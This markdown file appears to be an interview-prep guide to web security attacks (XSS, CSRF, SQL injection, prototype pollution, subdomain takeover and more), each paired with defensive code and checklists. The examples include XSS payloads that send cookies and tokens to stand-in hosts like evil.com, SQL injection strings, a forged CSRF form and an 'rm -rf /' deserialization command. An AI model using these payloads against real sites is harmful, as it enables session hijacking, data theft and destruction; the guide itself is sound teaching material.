@@ -1,0 +1,1037 @@
+# Frontend Security Attacks — Complete Guide
+
+> Every attack type, every subtype, how it works, real exploit examples, and exactly how to protect against it.
+
+---
+
+# ATTACK 1 — XSS (Cross-Site Scripting)
+
+## What is it?
+Attacker injects malicious JavaScript into your web page that runs in other users' browsers.  
+The browser has no idea the script is malicious — it executes it with full trust.
+
+**Goal of attacker:** Steal cookies/tokens, hijack sessions, redirect users, deface UI, keylog passwords.
+
+---
+
+## Type 1.1 — Stored XSS (Persistent XSS)
+
+### How it works
+Malicious script is **saved to the database** and served to every user who views that content.
+
+```
+Attacker submits a comment:
+"Great article! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
+
+→ Stored in DB
+→ Every user who views the comments page executes this script
+→ Their cookies are sent to evil.com
+→ Attacker hijacks their sessions
+```
+
+### Real exploit
+```html
+<!-- Attacker posts this as a product review -->
+<script>
+  const token = localStorage.getItem('authToken');
+  fetch('https://attacker.com/collect', {
+    method: 'POST',
+    body: JSON.stringify({ token, url: window.location.href })
+  });
+</script>
+```
+
+### Protection
+```jsx
+// ✅ React JSX auto-escapes — use it always
+<p>{comment.text}</p>
+// Renders: <p>&lt;script&gt;...&lt;/script&gt;</p>  ← harmless text
+
+// ✅ If you must render HTML — sanitize first
+import DOMPurify from 'dompurify';
+
+function Comment({ text }) {
+  return (
+    <div
+      dangerouslySetInnerHTML={{
+        __html: DOMPurify.sanitize(text, {
+          ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
+          ALLOWED_ATTR: []
+        })
+      }}
+    />
+  );
+}
+
+// Backend — sanitize BEFORE storing in DB
+const createDOMPurify = require('isomorphic-dompurify');
+const clean = createDOMPurify.sanitize(req.body.comment);
+await db.query('INSERT INTO comments (text) VALUES ($1)', [clean]);
+```
+
+---
+
+## Type 1.2 — Reflected XSS
+
+### How it works
+Script is in the **URL** — server reflects it back in the response without sanitizing.  
+Attacker tricks user into clicking a crafted link.
+
+```
+Attacker crafts URL:
+https://yourapp.com/search?q=<script>document.location='https://evil.com?c='+document.cookie</script>
+
+→ Sends link to victim via email/SMS/social media
+→ Victim clicks → server reflects the q param into the page
+→ Script executes in victim's browser
+```
+
+### Real exploit
+```
+Search page shows: "Results for: [q param here]"
+
+Malicious URL:
+https://yourapp.com/search?q=<img src=x onerror="fetch('https://evil.com?t='+localStorage.getItem('token'))">
+
+→ img fails to load → onerror fires → token stolen
+```
+
+### Protection
+```jsx
+// ✅ Never render URL params directly as HTML
+const params = new URLSearchParams(window.location.search);
+const query = params.get('q');
+
+// ❌ Bad
+document.getElementById('result').innerHTML = `Results for: ${query}`;
+
+// ✅ Good — use textContent, not innerHTML
+document.getElementById('result').textContent = `Results for: ${query}`;
+
+// ✅ In React — JSX handles this automatically
+function SearchResults() {
+  const [params] = useSearchParams();
+  const query = params.get('q');
+  return <h2>Results for: {query}</h2>; // auto-escaped
+}
+```
+
+---
+
+## Type 1.3 — DOM-Based XSS
+
+### How it works
+Script never hits the server — it's injected and executed **entirely in the browser** via unsafe DOM manipulation.
+
+```
+Page JS reads window.location.hash and writes it to innerHTML:
+document.getElementById('msg').innerHTML = window.location.hash.slice(1);
+
+Attacker sends:
+https://yourapp.com/page#<img src=x onerror=alert(document.cookie)>
+
+→ No server involved — runs directly in browser
+```
+
+### Real exploit patterns
+```js
+// ❌ Dangerous sinks — DOM-based XSS entry points
+element.innerHTML = userInput;
+element.outerHTML = userInput;
+document.write(userInput);
+document.writeln(userInput);
+eval(userInput);
+setTimeout(userInput, 100);     // string form of setTimeout
+new Function(userInput)();
+location.href = userInput;      // if userInput is javascript:...
+```
+
+### Protection
+```js
+// ✅ Safe DOM APIs — use these instead
+element.textContent = userInput;       // never executes as HTML
+element.setAttribute('data-val', userInput);
+
+// ✅ For URLs — validate protocol
+function safeRedirect(url) {
+  const parsed = new URL(url);
+  if (!['http:', 'https:'].includes(parsed.protocol)) {
+    throw new Error('Unsafe URL protocol');
+  }
+  window.location.href = url;
+}
+
+// ✅ Never pass user input to eval, setTimeout string, or new Function
+// ✅ Use DOMPurify if innerHTML is unavoidable
+```
+
+---
+
+## Type 1.4 — Mutation XSS (mXSS)
+
+### How it works
+You sanitize HTML → pass it to innerHTML → the browser's HTML parser **mutates** it during parsing into something that executes scripts. The sanitizer saw clean HTML, the browser sees different HTML.
+
+```html
+<!-- Input after sanitization (looks safe) -->
+<p id="test"><svg><![CDATA[</p><script>alert(1)</script>]]></svg></p>
+
+<!-- After browser parses it (mutated) -->
+<p id="test"><svg></svg></p><script>alert(1)</script><p></p>
+<!-- Script executes! -->
+```
+
+### Protection
+```js
+// ✅ Use DOMPurify — it's specifically built to handle mXSS
+// It serializes and re-parses multiple times to catch mutations
+
+import DOMPurify from 'dompurify';
+
+// Enable mXSS protection explicitly
+const clean = DOMPurify.sanitize(html, {
+  RETURN_DOM: false,
+  FORCE_BODY: true,    // forces into body context, prevents namespace confusion
+});
+```
+
+---
+
+## XSS — Master Protection Checklist
+
+```
+Code level:
+  ✅ Use JSX rendering — never innerHTML with user data
+  ✅ DOMPurify.sanitize() for any HTML rendering
+  ✅ Validate URL protocols before href/src assignment
+  ✅ Never use eval(), new Function(), setTimeout(string)
+  ✅ Sanitize on backend BEFORE storing in DB
+
+HTTP Headers:
+  ✅ Content-Security-Policy: script-src 'self'
+  ✅ X-XSS-Protection: 1; mode=block (legacy browsers)
+
+Tooling:
+  ✅ eslint-plugin-react: 'react/no-danger' rule = error
+  ✅ DOMPurify for all rich text rendering
+```
+
+---
+
+---
+
+# ATTACK 2 — CSRF (Cross-Site Request Forgery)
+
+## What is it?
+Attacker tricks an **already-authenticated** user's browser into making an unintended request to your server.  
+The browser automatically sends cookies with every request — the server thinks it's legitimate.
+
+**Goal:** Transfer money, change email/password, delete account, post content — anything the user can do.
+
+---
+
+## Type 2.1 — GET-Based CSRF
+
+### How it works
+Attacker embeds a GET request in an image tag on their site.  
+When victim visits attacker's page, browser fires the request with victim's cookies.
+
+```html
+<!-- Attacker's page -->
+<img src="https://yourbank.com/transfer?to=attacker&amount=10000" style="display:none">
+
+<!-- Victim visits attacker's page → browser GETs that URL with victim's bank cookies
+   → transfer executes if the bank uses GET for transfers (bad design) -->
+```
+
+### Protection
+```js
+// ✅ Never use GET for state-changing operations
+// GET = read only. POST/PUT/DELETE = mutations.
+
+// ❌ Bad API design
+app.get('/api/transfer', transferHandler);   // CSRF-able
+
+// ✅ Correct
+app.post('/api/transfer', authenticate, csrfProtection, transferHandler);
+```
+
+---
+
+## Type 2.2 — POST-Based CSRF
+
+### How it works
+Attacker creates a hidden auto-submitting form on their site.  
+When victim visits, form submits instantly with victim's cookies.
+
+```html
+<!-- Attacker's page — auto-submits on load -->
+<form id="csrf-form" action="https://yourapp.com/api/change-email" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+<script>document.getElementById('csrf-form').submit();</script>
+
+<!-- Victim's browser submits this form with their session cookie
+   → Email changed to attacker's email → account takeover -->
+```
+
+### Protection
+```js
+// ✅ CSRF Token pattern
+
+// Backend — generate and send token
+const csrf = require('csurf');
+const csrfProtection = csrf({ cookie: { httpOnly: false, secure: true, sameSite: 'strict' } });
+
+app.get('/api/csrf-token', csrfProtection, (req, res) => {
+  res.json({ csrfToken: req.csrfToken() });
+});
+
+// Frontend — include in every mutation
+const { data } = await axios.get('/api/csrf-token');
+const csrfToken = data.csrfToken;
+
+await fetch('/api/change-email', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'X-CSRF-Token': csrfToken  // attacker can't get this — same-origin only
+  },
+  body: JSON.stringify({ email: newEmail })
+});
+
+// Backend — validate token on every POST/PUT/DELETE
+// csurf middleware does this automatically
+app.post('/api/change-email', authenticate, csrfProtection, changeEmailHandler);
+```
+
+---
+
+## Type 2.3 — JSON-Based CSRF
+
+### How it works
+Modern APIs accept `Content-Type: application/json`.  
+Older belief: "JSON POST can't be forged cross-origin." This was wrong — Flash could do it, and some parsers accept `text/plain` with JSON body.
+
+```html
+<!-- Attacker's page -->
+<script>
+  fetch('https://yourapp.com/api/transfer', {
+    method: 'POST',
+    credentials: 'include',           // sends victim's cookies!
+    headers: { 'Content-Type': 'text/plain' },
+    body: '{"to":"attacker","amount":5000}'
+  });
+</script>
+```
+
+### Protection
+```js
+// ✅ Check Content-Type strictly on the server
+app.use((req, res, next) => {
+  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
+    if (!req.headers['content-type']?.includes('application/json')) {
+      return res.status(415).json({ error: 'Unsupported Media Type' });
+    }
+  }
+  next();
+});
+
+// ✅ SameSite cookie flag — most effective modern defense
+res.cookie('session', token, {
+  sameSite: 'strict',  // browser won't send cookie on cross-origin requests
+  httpOnly: true,
+  secure: true
+});
+```
+
+---
+
+## CSRF — Master Protection Checklist
+
+```
+  ✅ SameSite=Strict on all session cookies (primary defense)
+  ✅ CSRF token for all state-changing endpoints
+  ✅ CORS whitelist — only your domains allowed
+  ✅ Verify Content-Type: application/json on APIs
+  ✅ Never use GET for mutations
+  ✅ Custom request header (X-Requested-With: XMLHttpRequest)
+     — cross-origin requests can't set custom headers
+```
+
+---
+
+---
+
+# ATTACK 3 — SQL Injection
+
+## What is it?
+Attacker manipulates database queries by injecting SQL code into user inputs.  
+If your query is built by string concatenation, attacker controls the SQL itself.
+
+**Goal:** Dump entire database, bypass authentication, delete data, gain admin access.
+
+---
+
+## Type 3.1 — Classic SQL Injection
+
+### How it works
+```sql
+-- Your query (vulnerable)
+SELECT * FROM users WHERE email = '[user input]' AND password = '[user input]'
+
+-- Attacker enters as email:
+' OR '1'='1' --
+
+-- Resulting query:
+SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password = '...'
+-- The -- comments out the password check
+-- '1'='1' is always true → returns ALL users → logged in as first user (admin)
+```
+
+### Protection
+```js
+// ❌ String concatenation — NEVER
+const query = `SELECT * FROM users WHERE email = '${email}'`;
+
+// ✅ Parameterized query — ALWAYS
+const result = await pool.query(
+  'SELECT * FROM users WHERE email = $1 AND password_hash = $2',
+  [email, passwordHash]
+);
+// pg driver sends params separately — SQL structure can't be altered
+```
+
+---
+
+## Type 3.2 — Union-Based SQL Injection
+
+### How it works
+Attacker uses UNION to append results from other tables to the original query.
+
+```sql
+-- Vulnerable search query
+SELECT id, name, price FROM products WHERE name = '[input]'
+
+-- Attacker enters:
+' UNION SELECT username, password, email FROM users --
+
+-- Resulting query:
+SELECT id, name, price FROM products WHERE name = ''
+UNION SELECT username, password, email FROM users --'
+
+-- Returns all usernames and password hashes alongside products!
+```
+
+### Protection
+```js
+// ✅ Parameterized queries prevent this entirely
+// ✅ Principle of least privilege — DB user only has SELECT on products table
+//    Cannot select from users table even if injection occurs
+
+// PostgreSQL — create restricted DB user
+// CREATE USER app_user WITH PASSWORD 'secret';
+// GRANT SELECT, INSERT, UPDATE ON products TO app_user;
+// No access to users table at all
+```
+
+---
+
+## Type 3.3 — Blind SQL Injection
+
+### How it works
+App doesn't show DB errors — attacker infers data by asking true/false questions.
+
+```sql
+-- Boolean-based blind
+-- Attacker: does the first letter of admin password start with 'a'?
+https://yourapp.com/user?id=1 AND SUBSTRING(password,1,1)='a'
+
+-- If page loads normally → TRUE → first char is 'a'
+-- If page errors/changes → FALSE → try next char
+
+-- Time-based blind (when no visual difference)
+-- PostgreSQL
+id=1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --
+-- If page takes 5 seconds → condition was TRUE → data confirmed
+```
+
+### Protection
+```js
+// ✅ Parameterized queries — same fix
+// ✅ Never expose DB errors to users
+// ✅ Consistent response times (hard — but WAF helps)
+// ✅ Web Application Firewall detects sequential probing patterns
+
+// Express — never send raw DB errors
+app.use((err, req, res, next) => {
+  console.error(err); // log internally
+  res.status(500).json({ error: 'Something went wrong' }); // generic to user
+});
+```
+
+---
+
+## Type 3.4 — Second-Order SQL Injection
+
+### How it works
+Payload is stored safely in DB first, then used unsafely in a later query.
+
+```
+Step 1: Attacker registers with username: admin'--
+        → Stored safely in DB (parameterized INSERT)
+
+Step 2: App later does:
+        UPDATE users SET password = '[new]' WHERE username = 'admin'--'
+        → Built with string concat using the stored username
+        → Updates admin's password instead of attacker's!
+```
+
+### Protection
+```js
+// ✅ Use parameterized queries EVERYWHERE — not just on input, but when reading from DB too
+// ✅ Never trust data just because it came from your own database
+
+// Both these must be parameterized:
+// When storing:
+await pool.query('INSERT INTO users (username) VALUES ($1)', [username]);
+
+// When using stored value later:
+await pool.query(
+  'UPDATE users SET password_hash = $1 WHERE username = $2',
+  [newHash, storedUsername]  // storedUsername from DB — still parameterized!
+);
+```
+
+---
+
+## SQL Injection — Master Protection Checklist
+
+```
+  ✅ Parameterized queries / prepared statements — EVERYWHERE
+  ✅ ORM (Prisma, TypeORM) — uses parameterized queries by default
+  ✅ Stored procedures (also parameterized)
+  ✅ Principle of least privilege — DB user has only needed permissions
+  ✅ Never expose raw DB errors to users
+  ✅ Input validation — whitelist allowed characters where possible
+  ✅ WAF rules to detect SQL patterns
+```
+
+---
+
+---
+
+# ATTACK 4 — Clickjacking
+
+## What is it?
+Attacker embeds your legitimate website in a hidden `<iframe>` on their page.  
+They place transparent UI over it — victim thinks they're clicking attacker's button, actually clicking your app's button underneath.
+
+```
+Attacker's page (what victim sees):    Your app in hidden iframe (what actually gets clicked):
+┌──────────────────────────┐           ┌──────────────────────────┐
+│  WIN A FREE IPHONE!      │           │  [invisible]             │
+│                          │           │                          │
+│  [CLICK HERE TO CLAIM]   │  ←─────── │  [Delete Account]        │
+└──────────────────────────┘           └──────────────────────────┘
+opacity: 0 on iframe, positioned exactly behind "CLICK HERE" button
+```
+
+### Protection
+```js
+// ✅ X-Frame-Options header — prevents your site from being iframed
+// In Express with Helmet:
+app.use(helmet({ frameguard: { action: 'deny' } }));
+// Sends: X-Frame-Options: DENY
+
+// ✅ Content-Security-Policy frame-ancestors (modern, more flexible)
+// In Nginx:
+add_header Content-Security-Policy "frame-ancestors 'none'";
+
+// Allow only your own domain to iframe:
+add_header Content-Security-Policy "frame-ancestors 'self' https://dashboard.yourapp.com";
+
+// ✅ JavaScript frame-busting (legacy fallback)
+if (window.top !== window.self) {
+  window.top.location = window.self.location;
+}
+```
+
+---
+
+# ATTACK 5 — MITM (Man-in-the-Middle)
+
+## What is it?
+Attacker positions themselves between user and server — intercepts and reads (or modifies) all traffic.  
+Common on public WiFi (coffee shops, airports).
+
+```
+Victim  →  [Attacker intercepts]  →  Your Server
+                    ↓
+        Reads tokens, modifies responses,
+        injects scripts, captures passwords
+```
+
+## Types
+
+### Type 5.1 — HTTP Interception
+Site uses HTTP → all traffic is plaintext → attacker reads everything.
+
+### Type 5.2 — SSL Stripping
+Attacker downgrades HTTPS connection to HTTP even if your server supports HTTPS.
+
+```
+Victim requests: https://yourapp.com
+Attacker intercepts, requests https:// themselves, serves http:// to victim
+Victim sees http:// — all traffic now readable
+```
+
+### Type 5.3 — Fake WiFi Hotspot
+Attacker creates "Free Airport WiFi" network → all traffic routes through them.
+
+### Protection
+```js
+// ✅ HTTPS everywhere — TLS 1.2+ only
+// Nginx:
+ssl_protocols TLSv1.2 TLSv1.3;
+ssl_ciphers HIGH:!aNULL:!MD5:!RC4;
+
+// ✅ HTTP Strict Transport Security (HSTS)
+// Browser remembers to ALWAYS use HTTPS — SSL stripping impossible
+add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload";
+// After first visit, browser refuses to connect over HTTP — ever
+
+// ✅ Submit to HSTS Preload List
+// https://hstspreload.org → browser hardcodes your domain as HTTPS-only
+// Even first visit is HTTPS — zero window for SSL stripping
+
+// ✅ In Node — redirect HTTP to HTTPS
+app.use((req, res, next) => {
+  if (req.headers['x-forwarded-proto'] !== 'https') {
+    return res.redirect(301, `https://${req.hostname}${req.originalUrl}`);
+  }
+  next();
+});
+
+// ✅ Certificate Pinning (mobile apps)
+// App only accepts your specific SSL certificate — fake certs rejected
+```
+
+---
+
+# ATTACK 6 — Broken Authentication
+
+## What is it?
+Weak auth implementation that lets attackers take over accounts without knowing the password.
+
+## Types
+
+### Type 6.1 — Credential Stuffing
+Attacker uses breached username/password lists from other sites — tests them on your app.  
+Works because users reuse passwords.
+
+```
+Attacker has 1M leaked credentials from LinkedIn breach
+Fires them all at your /login endpoint
+1-2% hit rate = thousands of compromised accounts
+```
+
+### Protection
+```js
+// ✅ Rate limiting on login
+const authLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 5,
+  skipSuccessfulRequests: true
+});
+app.post('/api/auth/login', authLimiter, loginHandler);
+
+// ✅ Account lockout after N failures
+let failedAttempts = {}; // use Redis in production
+
+async function loginHandler(req, res) {
+  const key = req.ip + req.body.email;
+
+  if (failedAttempts[key] >= 5) {
+    return res.status(429).json({ error: 'Account temporarily locked' });
+  }
+
+  const valid = await verifyCredentials(req.body);
+  if (!valid) {
+    failedAttempts[key] = (failedAttempts[key] || 0) + 1;
+    return res.status(401).json({ error: 'Invalid credentials' });
+  }
+
+  failedAttempts[key] = 0;
+  // issue token...
+}
+
+// ✅ MFA — second factor defeats credential stuffing entirely
+// ✅ Have I Been Pwned API — warn users if their password was breached
+const { pwnedPassword } = require('hibp');
+const count = await pwnedPassword(password);
+if (count > 0) {
+  return res.status(400).json({ error: 'This password was found in a data breach. Choose another.' });
+}
+```
+
+### Type 6.2 — Brute Force
+Attacker systematically tries every possible password combination.
+
+### Protection
+```js
+// ✅ Rate limiting (same as above)
+// ✅ CAPTCHA after N failed attempts
+// ✅ bcrypt with high cost factor — each guess takes 100ms+
+const hash = await bcrypt.hash(password, 12); // 2^12 rounds
+// At 12 rounds: ~300ms to hash — brute force at scale becomes infeasible
+
+// ✅ Exponential backoff — lockout duration increases with attempts
+function getLockoutDuration(attempts) {
+  if (attempts < 5) return 0;
+  if (attempts < 10) return 60 * 1000;        // 1 minute
+  if (attempts < 20) return 15 * 60 * 1000;   // 15 minutes
+  return 24 * 60 * 60 * 1000;                 // 24 hours
+}
+```
+
+### Type 6.3 — Session Fixation
+Attacker sets a known session ID before login — after victim logs in, attacker uses same session ID.
+
+```
+1. Attacker gets session ID: sess=abc123
+2. Attacker tricks victim: https://yourapp.com/login?sessionid=abc123
+3. Victim logs in → server associates sess=abc123 with victim's account
+4. Attacker uses sess=abc123 → logged in as victim!
+```
+
+### Protection
+```js
+// ✅ Regenerate session ID after login — always
+app.post('/api/auth/login', async (req, res) => {
+  const user = await verifyCredentials(req.body);
+  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
+
+  // Destroy old session, create new one
+  req.session.regenerate((err) => {
+    req.session.userId = user.id;
+    req.session.role = user.role;
+    res.json({ success: true });
+  });
+});
+```
+
+---
+
+# ATTACK 7 — Sensitive Data Exposure
+
+## What is it?
+Sensitive information is accidentally exposed — in API responses, browser storage, URLs, logs, or source code.
+
+## Types
+
+### Type 7.1 — Over-Fetching API Data
+```js
+// ❌ Returns entire user object including hash, internal flags, etc.
+app.get('/api/profile', authenticate, async (req, res) => {
+  const user = await db.query('SELECT * FROM users WHERE id = $1', [req.user.id]);
+  res.json(user.rows[0]);
+  // Sends: { id, email, password_hash, is_admin, internal_notes, created_at, ... }
+});
+
+// ✅ Return only what's needed
+app.get('/api/profile', authenticate, async (req, res) => {
+  const user = await db.query(
+    'SELECT id, name, email, avatar_url, created_at FROM users WHERE id = $1',
+    [req.user.id]
+  );
+  res.json(user.rows[0]);
+});
+```
+
+### Type 7.2 — Sensitive Data in URLs
+```
+❌ https://yourapp.com/reset-password?token=abc123&email=user@mail.com
+   → URL appears in browser history, server logs, Referer headers
+
+✅ POST request with token in body
+✅ Short-lived one-time tokens, expired immediately after use
+```
+
+### Type 7.3 — Secrets in Frontend Bundle
+```js
+// ❌ In any React component or utility file
+const STRIPE_SECRET = 'sk_live_xxxx';  // bundled and visible to anyone
+const DB_PASSWORD = 'supersecret';
+
+// ✅ Only non-sensitive config in frontend
+const STRIPE_PK = process.env.NEXT_PUBLIC_STRIPE_PK; // publishable key only
+// Secret key stays server-side only
+```
+
+### Type 7.4 — console.log in Production
+```js
+// ❌
+console.log('User data:', user);       // contains PII
+console.log('Token:', accessToken);   // logs sensitive token
+
+// ✅ Remove all console.logs in production
+// Use a logger like Winston with log levels
+const logger = require('winston');
+
+// Only logs in development
+logger.debug('User logged in', { userId: user.id });  // no PII in logs
+
+// ESLint rule to catch this:
+"no-console": ["error", { allow: ["warn", "error"] }]
+```
+
+---
+
+# ATTACK 8 — Open Redirect
+
+## What is it?
+App redirects users to a URL provided in a parameter — attacker crafts URL that redirects to phishing site.
+
+```
+Legitimate feature: After login, redirect to where user was going
+URL: https://yourapp.com/login?redirect=/dashboard
+
+Attacker crafts:
+https://yourapp.com/login?redirect=https://evil-phishing-site.com
+
+Victim sees yourapp.com in the URL → trusts it → clicks → lands on phishing page
+```
+
+### Protection
+```js
+// ❌ Blind redirect
+const redirectUrl = req.query.redirect;
+res.redirect(redirectUrl);  // attacker controls destination
+
+// ✅ Whitelist allowed redirect paths
+function isSafeRedirect(url) {
+  // Only allow relative paths — no external URLs
+  try {
+    const parsed = new URL(url, 'https://yourapp.com');
+    return parsed.origin === 'https://yourapp.com';
+  } catch {
+    return false;
+  }
+}
+
+const redirectUrl = req.query.redirect;
+if (redirectUrl && isSafeRedirect(redirectUrl)) {
+  res.redirect(redirectUrl);
+} else {
+  res.redirect('/dashboard');  // default safe destination
+}
+```
+
+---
+
+# ATTACK 9 — Prototype Pollution
+
+## What is it?
+JavaScript allows modifying `Object.prototype` — attacker pollutes it to inject properties into every object in your app.
+
+```js
+// Attacker sends this JSON payload:
+{
+  "__proto__": {
+    "isAdmin": true,
+    "role": "admin"
+  }
+}
+
+// After JSON.parse or lodash merge:
+const user = {};
+console.log(user.isAdmin); // true — prototype was polluted!
+console.log(user.role);    // "admin" — every object is now admin!
+```
+
+### Real exploit path
+```js
+// Vulnerable code using lodash merge
+const _ = require('lodash');
+const userConfig = JSON.parse(req.body.config);
+_.merge({}, userConfig);  // older lodash versions — pollutes prototype
+
+// Later in auth check:
+if (req.user.isAdmin) { ... }  // true for everyone now!
+```
+
+### Protection
+```js
+// ✅ Use JSON.parse with null prototype objects
+const payload = JSON.parse(req.body);
+const safeObj = Object.assign(Object.create(null), payload);
+
+// ✅ Freeze Object.prototype
+Object.freeze(Object.prototype);
+
+// ✅ Use safe merge utilities
+const { merge } = require('deepmerge'); // prototype-pollution-safe
+
+// ✅ Validate and whitelist incoming object keys
+const allowedKeys = ['theme', 'language', 'notifications'];
+const config = {};
+allowedKeys.forEach(key => {
+  if (req.body[key] !== undefined) config[key] = req.body[key];
+});
+
+// ✅ Update lodash to >= 4.17.21 (patched versions)
+
+// ✅ ESLint — flag __proto__ usage
+"no-proto": "error"
+```
+
+---
+
+# ATTACK 10 — Insecure Deserialization
+
+## What is it?
+App deserializes (parses) data from client — attacker crafts malicious serialized data that executes code when parsed.
+
+```
+App accepts base64-encoded serialized object in cookie:
+eyJ1c2VySWQiOjEsInJvbGUiOiJ1c2VyIn0=  → {"userId":1,"role":"user"}
+
+Attacker crafts:
+eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9  → {"userId":1,"role":"admin"}
+
+Or worse — with node-serialize vulnerability:
+Crafted payload executes: require('child_process').exec('rm -rf /')
+```
+
+### Protection
+```js
+// ✅ Never deserialize untrusted data
+// ✅ Use JWT (signed) — tampering is detectable
+const token = jwt.verify(req.cookies.session, process.env.JWT_SECRET);
+// If attacker modifies payload → signature verification FAILS
+
+// ✅ If you must deserialize — validate schema after
+const Joi = require('joi');
+
+const schema = Joi.object({
+  userId: Joi.number().integer().positive().required(),
+  role: Joi.string().valid('user', 'editor').required()
+  // 'admin' is not in valid list — attacker can't elevate role
+});
+
+const { error, value } = schema.validate(JSON.parse(data));
+if (error) return res.status(400).json({ error: 'Invalid data' });
+```
+
+---
+
+# ATTACK 11 — Subdomain Takeover
+
+## What is it?
+Company sets up `api.yourapp.com` pointing to a cloud service (Heroku, S3, GitHub Pages).  
+Service is deleted but DNS record remains — attacker claims that service and now controls `api.yourapp.com`.
+
+```
+DNS: api.yourapp.com → CNAME → yourapp.herokuapp.com
+Company deletes Heroku app → yourapp.herokuapp.com is unclaimed
+Attacker creates Heroku app with name "yourapp" → controls api.yourapp.com!
+
+Now attacker can:
+→ Serve malicious scripts from api.yourapp.com (same origin as app)
+→ Set cookies for .yourapp.com domain
+→ Steal tokens, conduct phishing
+```
+
+### Protection
+```bash
+# ✅ Audit all DNS records regularly
+# Tool: subjack, nuclei, or manually check CNAME targets
+
+# Check if a CNAME target is still claimed:
+dig api.yourapp.com CNAME
+curl https://yourapp.herokuapp.com  # still yours?
+
+# ✅ Delete DNS records BEFORE decommissioning services
+# ✅ Use dangling DNS scanner in CI
+
+# GitHub Action — subdomain takeover scanner
+- uses: actions/checkout@v3
+- run: npx subjack -w subdomains.txt -t 20 -o results.txt
+```
+
+---
+
+# ATTACK 12 — Dependency Chain Attack (Supply Chain)
+
+## What is it?
+Attacker compromises an npm package your app depends on — malicious code runs in your app or CI pipeline.
+
+```
+Real example: event-stream (2018)
+→ Maintainer gave up package ownership
+→ Attacker added malicious code targeting Bitcoin wallets
+→ Millions of apps downloaded the compromised version
+
+Real example: node-ipc (2022)
+→ Maintainer deliberately added wiper malware
+→ Deleted files on Russian/Belarusian IP addresses
+→ Affected apps using vue-cli
+```
+
+### Protection
+```bash
+# ✅ npm audit on every install/CI run
+npm audit --audit-level=high
+
+# ✅ Lock exact versions
+npm shrinkwrap   # creates npm-shrinkwrap.json with exact tree
+
+# ✅ Verify package integrity
+npm ci           # uses package-lock.json exactly — no resolution surprises
+
+# ✅ Scoped installs — review what you're adding
+npm info malicious-package  # check download count, maintainers, last publish date
+
+# ✅ Socket.dev — scans for malicious packages before install
+npx socket npm install <package>
+
+# ✅ Snyk monitor — alerts you when new CVEs affect your deps
+npx snyk monitor
+```
+
+---
+
+# Complete Attack Reference Table
+
+| Attack | Layer Hit | How Attacker Wins | Primary Defense |
+|---|---|---|---|
+| Stored XSS | Frontend | Inject persistent script via user content | DOMPurify + CSP |
+| Reflected XSS | Frontend | Craft malicious URL → victim clicks | JSX rendering + input encoding |
+| DOM XSS | Frontend | Manipulate DOM via URL hash/params | textContent over innerHTML |
+| Mutation XSS | Frontend | Bypass sanitizers via browser parsing | DOMPurify (handles mXSS) |
+| CSRF GET | Backend | Embed request in img tag | Never use GET for mutations |
+| CSRF POST | Backend | Hidden auto-submitting form | CSRF tokens + SameSite cookie |
+| CSRF JSON | Backend | Cross-origin fetch with credentials | SameSite=Strict + CORS |
+| SQL Injection | Backend | Manipulate SQL query via input | Parameterized queries always |
+| Union SQLi | Backend | UNION to dump other tables | Parameterized + least privilege |
+| Blind SQLi | Backend | Infer data via true/false responses | Parameterized + no error leakage |
+| Second-order SQLi | Backend | Stored payload used in later query | Parameterize ALL queries |
+| Clickjacking | Frontend | Hidden iframe over your UI | X-Frame-Options: DENY + CSP |
+| MITM | Network | Intercept HTTP traffic | HTTPS + HSTS + preload |
+| SSL Stripping | Network | Downgrade HTTPS to HTTP | HSTS with preload |
+| Credential Stuffing | Auth | Leaked passwords from other breaches | Rate limit + MFA + HaveIBeenPwned |
+| Brute Force | Auth | Try all password combinations | Rate limit + bcrypt cost 12+ |
+| Session Fixation | Auth | Pre-set known session ID | Regenerate session after login |
+| Data Exposure | API | Over-fetching or logged secrets | Select only needed fields |
+| Open Redirect | Frontend | Redirect to phishing site | Whitelist redirect destinations |
+| Prototype Pollution | Backend | Pollute Object.prototype via JSON | freeze prototype + validate keys |
+| Insecure Deserialize | Backend | Craft malicious serialized payload | JWT + schema validation |
+| Subdomain Takeover | DNS/Infra | Claim dangling CNAME target | Audit DNS + delete before decommission |
+| Supply Chain | CI/Build | Malicious npm package | npm audit + lock versions + Socket.dev |
+
+---
+
+# Interview Closing Answer
+
+> *"Frontend attacks fall into a few categories — XSS exploits the DOM and trust the browser places in scripts, CSRF exploits the browser's automatic cookie sending, SQL injection exploits string-concatenated queries, and there are deeper attacks like prototype pollution, clickjacking, and supply chain compromises. My defense approach is layered: React's JSX handles basic XSS automatically, DOMPurify covers rich text, SameSite cookies + CSRF tokens cover request forgery, parameterized queries eliminate injection entirely, and Helmet sets the HTTP headers that prevent clickjacking and enforce HTTPS. The mindset is — every piece of user input is hostile until proven otherwise."*
